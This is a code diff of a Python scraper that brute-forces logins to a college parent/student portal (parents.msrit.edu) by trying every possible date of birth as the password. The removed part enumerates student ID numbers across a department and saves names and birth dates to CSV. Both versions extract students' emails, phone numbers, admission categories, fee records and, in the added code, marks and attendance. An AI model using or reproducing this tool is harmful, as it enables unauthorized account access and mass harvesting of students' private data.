@@ -1,152 +1,131 @@
-import os
-import pickle
-import tempfile
 import time
 from typing import Union
 from threading import Thread
 
-from scraper import Scraper, cached, gen_usn, roll_range
+import requests
 
+from scraper import Scraper, get_cache, set_cache, cached
 
-def get_cache():
-    try:
-        with open('cache1er2344.bin', 'rb') as file:
-            return pickle.load(file)
-    except FileNotFoundError:
-        return {}
+CACHE_NAME = "siscacheri92gh45"
 
 
 def gen_payload() -> dict[str, str]:
-    return {
-        "username": "",
-        "dd": "",
-        "mm": "",
-        "yyyy": "",
-        "passwd": "",
-        "remember": "",
-        "option": "com_user",
-        "task": "login",
-        "return": "",
-        "ea07d18ec2752bcca07e20a852d96337": "1"
-    }
+	return {
+		"username": "",
+		"dd": "",
+		"mm": "",
+		"yyyy": "",
+		"passwd": "",
+		"remember": "",
+		"option": "com_user",
+		"task": "login",
+		"return": "",
+		"ea07d18ec2752bcca07e20a852d96337": "1"
+	}
 
 
 class SisScraper(Scraper):
-    def save_cache(self):
-        with open('cache1er2344.bin', 'wb') as file:
-            pickle.dump(self.get_dob.cache, file)
+	URL = "https://parents.msrit.edu/"
+	MARKS_CURL = "index.php?option=com_studentdashboard&controller=studentdashboard&task=dashboard"
 
-    def __init__(self, URL="https://parents.msrit.edu/"):
-        self.URL = URL + ("/" if URL[-1] != "/" else "")
-        super(SisScraper, self).__init__()
+	def __exit__(self, exc_type, exc_val, exc_tb):
+		set_cache(CACHE_NAME, self.brute_year)
+		super(SisScraper, self).__exit__(exc_type, exc_val, exc_tb)
 
-    def get_post_body(self, payload):
-        soup = self.get_soap(self.URL, "POST", payload)
-        body = soup.body
-        if body.find(id="username") is None: return body
+	def get_logged_body(self, payload):
+		soup = self.get_soup(self.URL, "POST", payload)
+		body = soup.body
+		if body.find(id="username") is None: return body
 
-    def get_stats(self, payload) -> dict[str, str]:
-        body = self.get_post_body(payload)
-        if body is None: return {}
-        td = body.find_all("td")
-        trs = body.find_all("tbody")[1].find_all("tr")
-        return {
-            "name": td[0].text.split(":")[1].strip(),
-            "usn": payload["username"],
-            "dob": payload["passwd"],
-            "email": td[1].text.split(":")[1].strip(),
-            "sem": td[2].text.split(":")[1].strip(),
-            "quota": td[3].text.split(":")[1].strip(),
-            "mobile": td[4].text.split(":")[1].strip(),
-            "course": td[6].text.split(":")[1].strip(),
-            "category": td[8].text.split(":")[1].strip(),
-            "class": body.find_all("p")[6].text.strip(),
-            "batch": td[9].text.split(":")[1].strip(),
-            "paid": [tr.find_all("td")[3].text.strip() for tr in trs]
-        }
+	def get_curl_body(self, curl):
+		soup = self.get_soup(self.URL + curl)
+		body = soup.body
+		if body.find(id="username") is None: return body
 
-    def get_dept(self, head: str, year: str, dept: str, tolerate: int = 5):
-        payload = gen_payload()
-        tol = tolerate
-        for roll in roll_range():
-            if tol <= 0: return
-            payload["username"] = gen_usn(year, dept, roll, head)
-            payload["passwd"] = self.get_dob(payload["username"])
-            stats = self.get_stats(payload)
-            if not stats:
-                tol -= 1
-                continue
-            tol = tolerate
-            yield stats
+	def get_meta(self, payload) -> dict[str, str]:
+		body = self.get_logged_body(payload)
+		if body is None: return {}
+		td = body.find_all("td")
+		trs = body.find_all("tbody")[1].find_all("tr")
+		return {
+			"name": td[0].text.split(":")[1].strip(),
+			"usn": payload["username"],
+			"dob": payload["passwd"],
+			"email": td[1].text.split(":")[1].strip(),
+			"sem": td[2].text.split(":")[1].strip(),
+			"quota": td[4].text.split(":")[1].strip(),
+			"mobile": td[5].text.split(":")[1].strip(),
+			"course": td[6].text.split(":")[1].strip(),
+			"category": td[8].text.split(":")[1].strip(),
+			"class": body.find_all("p")[6].text.strip(),
+			"batch": td[9].text.split(":")[1].strip(),
+			"paid": [tr.find_all("td")[3].text.strip() for tr in trs]
+		}
 
-    @cached(get_cache())
-    def get_dob(self, usn) -> Union[str, None]:
-        join_year = int("20" + usn[3:5])
-        for year in [y := join_year - 18, y - 1, y + 1, y - 2]:
-            if dob := self.brute_year(usn, year): return dob
+	def __mark_worker(self, curl, marks: dict):
+		table = self.get_curl_body(curl).table
+		sub, code = table.find("caption").text.strip().replace(")", "").split("( ")
+		mark = [t.text.replace("Abscent", "0/0").split('/') if t.text != "-" else None for t in table.find_all("td")]
+		marks[code] = {
+			"sub": sub,
+			"attd": int(mark.pop(-2)[0].removesuffix("%")),
+			"cies": [tuple(map(int, m)) for m in mark[:4] if m is not None],
+			"ces": [tuple(map(int, m)) for m in mark[4:7] if m is not None],
+			"tot": tuple(map(int, mark[7])),
+		}
 
-    def brute_year(self, usn: str, year: int) -> Union[str, None]:
-        workers = []
-        dob = [None]
-        for month in range(1, 13):
-            worker = Thread(target=self.brute_month, args=(usn, year, month, dob))
-            workers.append(worker)
-            worker.start()
-        for worker in workers:
-            worker.join()
-        return dob.pop()
+	def get_marks(self, lite=False) -> dict[str, Union[dict, tuple]]:
+		body = self.get_curl_body(self.MARKS_CURL)
+		subs = body.find("tbody").find_all("tr")
+		if lite:
+			chart = body.find_all("script")[4].text
+			marks = dict(eval(chart[chart.find("["):chart.rfind("]") + 1]))
+			for (key, val), sub in zip(marks.items(), subs):
+				marks[key] = (sub.text.split("\n")[2], int(sub.find_all("button")[-2].text), val)
+			return marks
+		marks = {}
+		workers = []
+		for s in subs:
+			worker = Thread(target=self.__mark_worker, args=(s.find_all("a")[-1].get("href"), marks))
+			worker.start()
+			workers.append(worker)
+		for worker in workers: worker.join()
+		return marks
 
-    def brute_month(self, usn: str, year: int, month: int, dob_thread: list = None) -> Union[str, None]:
-        payload = gen_payload()
-        assert (dob_list := isinstance(dob_thread, list)) or dob_thread is None, \
-            "dob_thread must be a list, used for threading"
-        if dob_list:
-            assert len(dob_thread) == 1, \
-                "dob_thread must have a single element, used for default value"
-        for day in range(1, 32):
-            if dob_list and len(dob_thread) > 1: return
-            payload['username'] = usn.lower()
-            payload['passwd'] = f"{year}-{month:02}-{day:02}"
-            if self.get_post_body(payload):
-                if dob_list: dob_thread.append(payload['passwd'])
-                return payload['passwd']
+	def brute_month(self, usn: str, year: int, month: int, *, _INTERNAL_THREAD_USE=None) -> Union[str, None, bool]:
+		payload = gen_payload()
+		for day in range(1, 32):
+			if _INTERNAL_THREAD_USE is not None and any(_INTERNAL_THREAD_USE): return
+			payload['username'] = usn.lower()
+			payload['passwd'] = f"{year}-{month:02}-{day:02}"
+			try:
+				body = self.get_logged_body(payload)
+			except Exception as e:
+				print(e)
+				_INTERNAL_THREAD_USE.append(None)
+				return
+			if body is not None:
+				if _INTERNAL_THREAD_USE is not None: _INTERNAL_THREAD_USE.append(payload['passwd'])
+				return payload['passwd']
+		_INTERNAL_THREAD_USE.append(False)
+		return False
 
-    def __exit__(self, exc_type, exc_val, exc_tb):
-        self.save_cache()
-        super(SisScraper, self).__exit__(exc_type, exc_val, exc_tb)
+	@cached(get_cache(CACHE_NAME))
+	def brute_year(self, *, usn: str, year: int) -> Union[str, None, bool]:
+		workers = []
+		dob = []
+		for month in range(1, 13):
+			worker = Thread(target=self.brute_month, args=(usn, year, month), kwargs={"_INTERNAL_THREAD_USE": dob})
+			worker.start()
+			workers.append(worker)
+		for worker in workers: worker.join()
+		all_false = True
+		for d in dob:
+			if d: return d
+			if d is None: all_false = False
+		if all_false: return False
 
-
-def macro(head: str, year: str, dept: str, file=None, dry: bool = False):
-    if not os.path.exists(f"sis/{dept}") and not dry: os.mkdir(f"sis/{dept}")
-    file = f"sis/{dept}/sis_{year}_{dept}.csv" if file is None else file
-    with SisScraper() as SIS, \
-            tempfile.TemporaryFile("w+") if dry else open(file, "w+") as f:
-        write = \
-            f"{'usn':{len(head + year + dept) + 3 + 5}}," \
-            f"{'name':64}," \
-            f"{'dob':10}," \
-            f""
-        if not dry: f.write(write + "\n")
-        print(f"[Log] {'Time':10} :", write)
-        t = time.time()
-        for stat in SIS.get_dept(head, year, dept):
-            write = \
-                f"{stat['usn']:{len(head + year + dept) + 3 + 5}}," \
-                f"{stat['name']:64}," \
-                f"{stat['dob']:10}," \
-                f""
-            if not dry:
-                f.write(write + "\n")
-                f.flush()
-            print(f"[Log] {time.time() - t:07.3f}sec :", write)
-            t = time.time()
-            SIS.save_cache()
-
-
-if __name__ == '__main__':
-    HEAD = "1MS"
-    YEAR = "21"
-    DEPT = "IS"
-    # macro(HEAD, YEAR, DEPT, dry=False)
-    with SisScraper() as SIS:
-        print(SIS.brute_year("1MS21IS063", 2003))
+	def get_dob(self, usn) -> Union[str, None]:
+		join_year = int("20" + usn[3:5])
+		for year in [y := join_year - 18, y - 1, y + 1, y - 2, y - 3]:
+			if dob := self.brute_year(usn=usn, year=year): return dob
